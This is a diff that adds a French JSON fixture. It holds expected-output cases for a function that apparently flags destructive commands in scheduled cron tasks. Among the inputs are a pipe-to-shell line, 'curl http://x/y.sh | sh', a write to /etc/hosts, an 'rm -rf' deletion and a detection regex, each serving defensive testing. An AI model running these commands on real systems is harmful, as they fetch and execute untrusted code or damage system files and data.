@@ -1,0 +1,133 @@
+{
+ "point": "planifie.destructeur",
+ "contrat": "1.0",
+ "origine": "sorties de la référence copiée mot pour mot de l'ancien code de planifie, données synthétiques",
+ "cas": [
+  {
+   "cas": "cas 01",
+   "entree": {
+    "commande": "curl http://x/y.sh | sh"
+   },
+   "sortie": {
+    "valeur": "exécution directe d'un contenu téléchargé"
+   }
+  },
+  {
+   "cas": "cas 02",
+   "entree": {
+    "commande": "echo a > /etc/hosts"
+   },
+   "sortie": {
+    "valeur": "écriture dans une arborescence système"
+   }
+  },
+  {
+   "cas": "cas 03",
+   "entree": {
+    "commande": "/usr/local/bin/sauvegarde.sh --nuit"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 04",
+   "entree": {
+    "commande": "rm -rf /var/cache/x"
+   },
+   "sortie": {
+    "valeur": "motif destructeur : rm -[rf]"
+   }
+  },
+  {
+   "cas": "cas 05",
+   "entree": {
+    "commande": "echo bonjour >> /var/log/x.log"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 06",
+   "entree": {
+    "commande": "cassé"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 07",
+   "entree": {
+    "commande": "MAILTO=admin@x.fr"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 08",
+   "entree": {
+    "commande": "\\b(perl|python3?|ruby)\\s+.*-i\\b"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 09",
+   "entree": {
+    "commande": "Bancs des tâches planifiées : la logique pure des expressions cron, puis le module avec un courtier simulé (une machine dont on tient les crontabs)."
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 10",
+   "entree": {
+    "commande": "critique"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 11",
+   "entree": {
+    "commande": "delier"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 12",
+   "entree": {
+    "commande": "5-2"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 13",
+   "entree": {
+    "commande": "racine"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  },
+  {
+   "cas": "cas 14",
+   "entree": {
+    "commande": "apercu"
+   },
+   "sortie": {
+    "valeur": ""
+   }
+  }
+ ]
+}
